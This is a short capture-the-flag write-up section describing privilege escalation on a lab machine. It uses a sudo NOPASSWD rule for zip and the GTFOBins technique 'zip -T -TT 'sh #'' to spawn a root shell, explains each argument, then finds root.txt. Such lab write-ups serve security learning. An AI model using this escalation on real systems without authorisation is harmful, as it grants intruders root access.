### 2. Escalate privileges and obtain root.txt

First in this check some privilege:
````
sudo -l
````

<img width="1135" height="157" alt="image" src="https://github.com/user-attachments/assets/8299408c-521e-43e1-89c4-ca722da1af9a" />



Now we see:
````
(root : root) NOPASSWD: /usr/bin/zip
````

So in this it have vulnerability as zip file.



Then exploit ZIP and obtain root access:


Go to: https://gtfobins.org/gtfobins/zip/

<img width="1452" height="988" alt="image" src="https://github.com/user-attachments/assets/26affce9-5182-4dfa-92ee-b26400c60177" />


In this we can use command from this:


So in this I use:

````shell
sudo /usr/bin/zip "$TF" /etc/hosts -T -TT 'sh #'
````


<img width="653" height="135" alt="image" src="https://github.com/user-attachments/assets/a9bac919-8f81-49f6-86c9-259c0c498b35" />


Now we got `root`.

| Part | Purpose |
| :--- | :--- |
| **sudo** | Execute with root privileges |
| **/usr/bin/zip** | ZIP program |
| **"$TF"** | Temporary archive filename |
| **/etc/hosts** | File to place in the archive |
| **-T** | Test the archive |
| **-TT** | Specify an external test command |
| **'sh #'** | Launch a shell and comment out additional arguments |



Then find root flag:
````shell
find / -name "*root.txt*" 2>/dev/null
````

<img width="432" height="96" alt="image" src="https://github.com/user-attachments/assets/03408815-dadb-4eea-b4a4-a44184a5a382" />
